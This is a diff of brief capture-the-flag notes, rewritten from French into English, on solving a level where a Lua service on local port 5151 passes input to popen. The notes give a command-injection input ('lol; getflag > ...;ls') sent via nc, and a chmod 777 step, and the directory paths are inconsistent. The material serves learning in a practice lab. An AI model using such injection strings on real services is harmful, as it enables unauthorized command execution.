@@ -1,3 +1,6 @@
-On a commencer a chercher le hash avant de comprendre meme si ca marchait ca nous apporterais rien.
-On regarde le code lua et apres l'avoirrepliquer sur notre machine, on voit un popen qui execute du shell on se dit qu'on va executer du shell
-On nc 127.0.0.1 5151 puis on tappe cette commande "lol; getflag >/tmp/oui/lol;ls" ne pas oublier de chmod 777 /tmp/oui
+# We started to search for the right hash but it s
+# wrong path.
+# In the Lua script there a popen that execute a command shell
+# first nc 127.0.0.1 5151 
+# then type "lol; getflag > tmp/11/flag;ls"
+# dont forget to chmod 777 /tmp/10
